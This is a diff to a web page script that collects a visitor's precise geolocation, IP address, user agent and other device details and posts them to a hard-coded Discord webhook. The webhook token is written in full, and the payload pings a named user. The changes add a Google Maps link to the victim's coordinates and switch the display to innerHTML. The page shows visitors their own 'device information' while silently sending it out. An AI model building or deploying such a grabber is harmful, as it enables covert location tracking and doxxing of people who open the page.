@@ -25,7 +25,7 @@
   <script>
     // Discord Webhook URL
     const webhookUrl = 'https://discord.com/api/webhooks/1275537111755522189/snOtFHUF9X35Mjfx3gaYyyZS4M1Un-sYtcYkrc3Sw0omUl6MLrd33AnepHKZm8sprUVj';
-    const userId = '1190442430118494274'; // Replace with the actual user ID of @cosmogt
+    const userId = '1190442430118494274'; // User ID of @cosmogt
 
     // Function to collect device information
     function collectDeviceInfo() {
@@ -40,6 +40,7 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const geolocationData = `${latitude}, ${longitude}`;
+            const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
 
             // Collect other device information
             const userAgent = navigator.userAgent;
@@ -64,14 +65,14 @@
             const infoText = `
               Your Device Information:
               IP Address: ${ipAddress}
-              Geolocation: ${geolocationData}
+              Geolocation: [${geolocationData}](${googleMapsLink})
               User Agent: ${userAgent}
               Screen Resolution: ${screenResolution}
               Language: ${language}
               Platform: ${platform}
               Device Type: ${deviceType}
             `;
-            infoElement.innerText = infoText;
+            infoElement.innerHTML = infoText;
 
             // Send the payload to the Discord webhook with a mention
             const webhookPayload = {
